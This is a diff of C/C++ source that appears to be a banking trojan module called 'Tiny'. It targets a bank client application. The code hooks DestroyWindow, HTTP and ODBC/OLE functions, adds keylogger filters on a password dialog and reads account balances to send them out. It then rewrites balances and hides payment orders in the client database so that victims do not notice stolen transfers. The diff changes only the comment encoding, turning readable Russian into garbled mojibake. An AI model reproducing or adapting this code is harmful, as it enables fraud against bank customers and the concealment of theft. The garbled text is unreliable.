+		char* classWnd3 = "TKeyPasswordDlg"; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		PKlgWndFilter F3 = KeyLogger::AddFilter(S, true, true, classWnd3, 0, FILTRATE_PARENT_WND, LOG_ALL, 5);
 		if( F3 )
 		{
@@ -959,34 +970,34 @@ static bool SetHooks()
 {
 	if( HookApi( DLL_USER32, 0xEB4A6DB3, &HandlerDestroyWindow, &RealDestroyWindow ) )
 	{
-		DBG( "Tiny", "установили хук на DestroyWindow" );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ DestroyWindow" );
 	}
 //	if( HookApi( DLL_WINSOCK, 0xEDD8FE8A, &HandlerConnect, &RealConnect ) )
 //	{
-//		DBG( "Tiny", "установили хук на Conenct" );
+//		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ Conenct" );
 //	}
 	if( HookApi( DLL_WININET, 0x9F13856A, &HandlerHttpSendRequestA, &RealHttpSendRequestA ) )
 	{
-		DBG( "Tiny", "установили хук на HttpSendRequest" );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ HttpSendRequest" );
 	}
 	return true;
 }
 
 static bool SetHooks2()
 {
-	if( HashCurrProcess == PROCESS_HASH ) //новый клиент работает через OleDb
+	if( HashCurrProcess == PROCESS_HASH ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ OleDb
 	{
 		if( HookApi( DLL_OLE32, 0x368435BE, &HandlerCoCreateInstance, &RealCoCreateInstance ) )
-			DBG( "Tiny", "установили хук на CoCreateInstance" );
+			DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ CoCreateInstance" );
 	}
-	if( HashCurrProcess == PROCESS_HASH2 ) //старый клиент работает через ODBC
+	if( HashCurrProcess == PROCESS_HASH2 ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ ODBC
 	{
 //		if( HookApi( DLL_ODBC32, 0x3941DBB7, HandlerSQLDriverConnectA, &RealHandlerSQLDriverConnectA ) ) 
-//			DBG( "Tiny", "установили хук на SQLDriverConnectA" );
+//			DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ SQLDriverConnectA" );
 		if( HookApi( DLL_ODBC32, 0xC09D6D06, HandlerSQLPrepareA, &RealSQLPrepareA ) ) 
-			DBG( "Tiny", "установили хук на SQLPrepareA" );
+			DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ SQLPrepareA" );
 		if( HookApi( DLL_ODBC32, 0xD4667870, HandlerSQLExecDirectA, &RealSQLExecDirectA ) ) 
-			DBG( "Tiny", "установили хук на SQLExecDirectA" );
+			DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ SQLExecDirectA" );
 	}
 	return true;
 }
@@ -1005,40 +1016,40 @@ static bool InitData()
 }
 
 ///////////////////////////////////////////////////////////////////////////////////////////
-//обработка запросов
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 static int FSF_SelectAmounts( WCHAR* sql, int len )
 {
-	stateSQL = 1; //чтение баланса
+	stateSQL = 1; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DBG( "Tiny", "FSF_SelectAmounts(): stateSQL = 1, %ls", sql );
-	return 1; //оставить запрос как есть
+	return 1; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 }
 
 static int FSF_SelectAmountsOld( WCHAR* sql, int len )
 {
-	DBG( "Tiny", "FSF_SelectAmountsOld(): запрос баланса, %ls", sql );
+	DBG( "Tiny", "FSF_SelectAmountsOld(): пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, %ls", sql );
 	RunThread( SendBalanceOld, 0 );
-	return 1; //оставить запрос как есть
+	return 1; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 }
 
 static int FSF_UpdateConfigLastSync( WCHAR* sql, int len )
 {
 	runHideReplacement = true;
 	DBG( "Tiny", "FSF_UpdateConfigLastSync(): runHideReplacement=true" );
-	pSleep(2000); //делаем задержку, чтобы успела сработать подмена
-	return 1; //оставить запрос как есть
+	pSleep(2000); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	return 1; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 }
 
 //////////////////////////////////////////////////////////////////////////////////////////
-//чтение полей
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 static void FV_Code_Amounts( VARIANT* v )
 {
 	if( stateSQL == 1 || stateSQL == 2 )
 	{
-		//счет в таблице представлен как "xxxx xxxxxxxy.zzz", где zzz код валюты (на нужна 980)
-		//вместо пробела (5-я позиция) нужно поставить символ y, почему так сделано неизвестно
-		//другими слова приводим счет к нормальному виду
+		//пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ "xxxx xxxxxxxy.zzz", пїЅпїЅпїЅ zzz пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 980)
+		//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (5-пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ) пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ y, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		int space = 0;
 		wchar_t* p = v->bstrVal;
 		wchar_t account[32];
@@ -1069,17 +1080,17 @@ static void FV_Code_Amounts( VARIANT* v )
 		currAccount = -1;
 		for( i = 0; i < ARRAYSIZE(accountClient) - 1 && accountClient[i].account[0]; i++ )
 		{
-			if( !m_wcsncmp( account, accountClient[i].account, len ) ) //такой счет есть в массиве
+			if( !m_wcsncmp( account, accountClient[i].account, len ) ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			{
 				currAccount = i;
 				break;
 			}
 		}
-		if( currAccount < 0 ) //в массиве нет такого счета
+		if( currAccount < 0 ) //пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		{
-			if( i < ARRAYSIZE(accountClient) - 1 ) //есть еще место в массиве
+			if( i < ARRAYSIZE(accountClient) - 1 ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			{
-				//добавляем счет
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 				m_wcsncpy( accountClient[i].account, account, len + 1 );
 				accountClient[i + 1].account[0] = 0;
 				currAccount = i;
@@ -1087,7 +1098,7 @@ static void FV_Code_Amounts( VARIANT* v )
 		}
 		if( currAccount >= 0 )
 		{
-			stateSQL = 2; //счет считан, можно считывать баланс
+			stateSQL = 2; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			DBG( "Tiny", "stateSQL = 2, account = %ls", account );
 		}
 	}
@@ -1118,15 +1129,15 @@ static void FV_FullName_Amounts( VARIANT* v )
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////
-// Функции подмены и скрытия
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 ////////////////////////////////////////////////////////////////////////////////////////
 
-//переводит сумму в целочисленное число, два последних числа это копейки, останавливается на символе которого
-//не может быть в числе, в len будет количество прочитанных символов (символов в числе)
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅ len пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ)
 static __int64 SumToInt( const char* s, int* len )
 {
 	__int64 v = 0;
-	int kop = -1; //количество чисел в копейках, чтобы при нехватке сделать два числа
+	int kop = -1; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	const char* p = s;
 	while( *s == ' ' ) s++;
 	while( (*s >= '0' && *s <= '9') || *s == '.'  )
@@ -1140,14 +1151,14 @@ static __int64 SumToInt( const char* s, int* len )
 		}
 		s++;
 	}
-	//добавляем нули в конце чтобы всегда в копейках было две цифры
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if( kop < 0 ) kop = 0;
 	for( int i = kop; i < 2; i++ ) v *= 10; 
 	if( len ) *len = s - p;
 	return v;
 }
 
-//текст в число, до 1-го не числового символа
+//пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ 1-пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static int ValueToInt( const char* s, int* len )
 {
 	int v = 0;
@@ -1162,7 +1173,7 @@ static int ValueToInt( const char* s, int* len )
 	return v;
 }
 
-//чтение даты в формате dd.mm.yyyy hh:mm:ss, возвращает количество считанных символов
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ dd.mm.yyyy hh:mm:ss, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static int ReadDate( const char* s, TIMESTAMP_STRUCT* date )
 {
 	m_memset( date, 0, sizeof(TIMESTAMP_STRUCT) );
@@ -1200,7 +1211,7 @@ static int ReadString( const char* s, char* buf )
 	return s - p;
 }
 
-//конвертация счета из базы данных в нормальный вид
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 static char* AccountToNormal( const char* from, char* to )
 {
 	int space = 0;
@@ -1257,24 +1268,24 @@ static char* ConvertAccount( const char* from, char* to )
 	return to;
 }
 
-//считывает строку вида
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //"40702810300010100847 4.82 25.11.2012 10:11: 12, 40702810300010100847 1000.00 27.11.2012; 40702810300010100847 675 26.11.2012, 40702810300010100847 678 28.11.20012";
-//где через запятую перечисляются балансы для подмены: счет сумма дата
-//после точки с запятой идут скрываемые платежки (через запятую): счет номер платежки дата
+//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ): пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 static void ReadReplacement( const char* s )
 {
-	//чтение остатка
+	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int n = 0;
 	DWORD size;
 	RestAccount* restAccounts2 = (RestAccount*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(TinyOldBalans).t_str() ).t_str(), size );
 	m_memset( &restAccounts, 0, sizeof(restAccounts) );
 	while( *s )
 	{
-		//считываем счет
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		char account[32];
 		s += ReadString( s, account );
 		ConvertAccount( account, restAccounts[n].account );
-		//ищем указанный счет и забираем суммы до подмены
+		//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		int i = 0;
 		while( restAccounts2[i].account[0] )
 		{
@@ -1286,16 +1297,16 @@ static void ReadReplacement( const char* s )
 			}
 			i++;
 		}
-		//сумма
+		//пїЅпїЅпїЅпїЅпїЅ
 		int len;
 		restAccounts[n].sum = SumToInt( s, &len );
 		s += len;
 		restAccounts[n].debet = SumToInt( s, &len );
 		s += len;
-		//дата
+		//пїЅпїЅпїЅпїЅ
 		s += ReadDate( s, &restAccounts[n].date );
-		DBG( "Tiny", "Загрузили подмену баланса для счета: %s, остаток: %I64d, дебет: %I64d", restAccounts[n].account, restAccounts[n].sum, restAccounts[n].debet );
-		DBG( "Tiny", "Дата %02d.%02d.%02d", restAccounts[n].date.day, restAccounts[n].date.month, restAccounts[n].date.year );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ: %s, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: %I64d, пїЅпїЅпїЅпїЅпїЅ: %I64d", restAccounts[n].account, restAccounts[n].sum, restAccounts[n].debet );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅ %02d.%02d.%02d", restAccounts[n].date.day, restAccounts[n].date.month, restAccounts[n].date.year );
 		while( *s == ' ' ) s++;
 		n++;
 		if( n >= ARRAYSIZE(restAccounts) - 1 ) break;
@@ -1308,11 +1319,11 @@ static void ReadReplacement( const char* s )
 	n = 0;
 	while( *s )
 	{
-		//считываем счет
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		char account[32];
 		s += ReadString( s, account );
 		ConvertAccount( account, hidePayments[n].account );
-		//ищем указанный счет и забираем даты до скрытия
+		//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		int i = 0;
 		while( hidePayments[i].account[0] )
 		{
@@ -1325,12 +1336,12 @@ static void ReadReplacement( const char* s )
 			}
 			i++;
 		}
-		//номер платежки
+		//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		s += ReadString( s, hidePayments[n].num );
 		s += ReadDate( s, &hidePayments[n].date );
 		while( *s == ' ' ) s++;
-		DBG( "Tiny", "Загрузили скрытие платежки: %s %s", hidePayments[n].account, hidePayments[n].num );
-		DBG( "Tiny", "Дата %02d.%02d.%02d", hidePayments[n].date.day, hidePayments[n].date.month, hidePayments[n].date.year );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ: %s %s", hidePayments[n].account, hidePayments[n].num );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅ %02d.%02d.%02d", hidePayments[n].date.day, hidePayments[n].date.month, hidePayments[n].date.year );
 		n++;
 		if( *s == 0 || n >= ARRAYSIZE(hidePayments) - 1 ) break;
 		s++;
@@ -1338,8 +1349,8 @@ static void ReadReplacement( const char* s )
 	MemFree(hidePayments2);
 }
 
-//конвертирует дату в целое число посредством запроса в базу данных, в клиенте
-//целое число даты на 2 меньше
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ 2 пїЅпїЅпїЅпїЅпїЅпїЅ
 static int ConvertDate( ODBC* DB, TIMESTAMP_STRUCT* date )
 {
 	DWORD MyDate;
@@ -1349,10 +1360,10 @@ static int ConvertDate( ODBC* DB, TIMESTAMP_STRUCT* date )
 	return MyDate;
 }
 
-//корректировка баланса
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static void ReplacementBalance()
 {
-	DBG( "Tiny", "Осуществляем подмену баланса" );
+	DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	int n = 0;
 	ODBC* DB = OpenDB();
 	if( DB )
@@ -1362,8 +1373,8 @@ static void ReplacementBalance()
 		fwsprintfA pwsprintfA = Get_wsprintfA();
 		while( restAccounts[n].account[0] )
 		{
-			DBG( "Tiny", "Для счета %s ставим баланс %I64d", restAccounts[n].account, restAccounts[n].sum );
-			//смотрим какой текущий баланс 
+			DBG( "Tiny", "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %I64d", restAccounts[n].account, restAccounts[n].sum );
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 
 			char SUM[32];
 			sql = "select Expected from Amounts where Code=?";
 			SQLHSTMT qr = DB->ExecuteSql( sql, "os31 is31", SUM, restAccounts[n].account );
@@ -1371,9 +1382,9 @@ static void ReplacementBalance()
 			{
 				DB->CloseQuery(qr);
 				__int64 sum = SumToInt( SUM, 0 );
-				DBG( "Tiny", "Текущий баланс %I64d", sum );
+				DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %I64d", sum );
 				__int64 v = restAccounts[n].sum;
-				if( sum != v ) //еще не было подмены или затерли нашу подмену
+				if( sum != v ) //пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				{
 					sql = "update Amounts set Expected=%d.%02d,Confirmed=%d.%d where Code='%s'";
 					pwsprintfA( sqlBuf.AsStr(), sql, (DWORD)(v / 100), (DWORD)(v % 100), (DWORD)(v / 100), (DWORD)(v % 100), restAccounts[n].account );
@@ -1384,16 +1395,16 @@ static void ReplacementBalance()
 				}
 			}
 
-			DBG( "Tiny", "Для счета %s ставим дебет %I64d", restAccounts[n].account, restAccounts[n].debet );
+			DBG( "Tiny", "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %I64d", restAccounts[n].account, restAccounts[n].debet );
 			int DayDate = ConvertDate( DB, &restAccounts[n].date );
-			//извлекаем текущее значение дебета (сумму расхода за день)
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ)
 			sql = "select ConDebit from Turns where Code=? and DayDate=?";
 			qr = DB->ExecuteSql( sql, "os31 is31", SUM, restAccounts[n].account, &DayDate );
 			if( qr )
 			{
 				DB->CloseQuery(qr);
 				__int64 sum = SumToInt( SUM, 0 );
-				DBG( "Tiny", "Текущий дебет %I64d", sum );
+				DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %I64d", sum );
 				__int64 v = restAccounts[n].debet;
 				if( sum != v )
 				{
@@ -1412,14 +1423,14 @@ static void ReplacementBalance()
 	}
 }
 
-//скрытие платежек
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static void HidePayments()
 {
-	DBG( "Tiny", "Скрываем платежки" );
+	DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	ODBC* DB = OpenDB();
 	if( DB )
 	{
-		DWORD dateFirst; //самая ранняя дата платежек
+		DWORD dateFirst; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		const char* sql = "select min(OrgDate) from Documents";
 		SQLHSTMT qr = DB->ExecuteSql( sql, "oi", &dateFirst );
 		if( qr )
@@ -1430,8 +1441,8 @@ static void HidePayments()
 			int n = 0;
 			while( hidePayments[n].account[0] )
 			{
-				DBG( "Tiny", "Скрываем платежку %s %s", hidePayments[n].account, hidePayments[n].num );
-				TIMESTAMP_STRUCT endDay; //конец дня, для выбора платежки за определенный день
+				DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s %s", hidePayments[n].account, hidePayments[n].num );
+				TIMESTAMP_STRUCT endDay; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 				m_memcpy( &endDay, &hidePayments[n].date, sizeof(endDay) );
 				endDay.hour = 23;
 				endDay.minute = 59;
@@ -1477,7 +1488,7 @@ static void HidePayments()
 	}
 }
 
-//восстановить баланс и скрываемую платежку
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static void RestoreBalansAndDocs()
 {
 	ODBC* DB = OpenDB();
@@ -1487,11 +1498,11 @@ static void RestoreBalansAndDocs()
 		const char* sql;
 		fwsprintfA pwsprintfA = Get_wsprintfA();
 
-		DBG( "Tiny", "Восстаналиваем баланс" );
+		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ" );
 		int n = 0;
 		while( restAccounts[n].account[0] )
 		{
-			DBG( "Tiny", "Для счета %s восстанавливаем баланс %I64d", restAccounts[n].account, restAccounts[n].oldSum );
+			DBG( "Tiny", "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %I64d", restAccounts[n].account, restAccounts[n].oldSum );
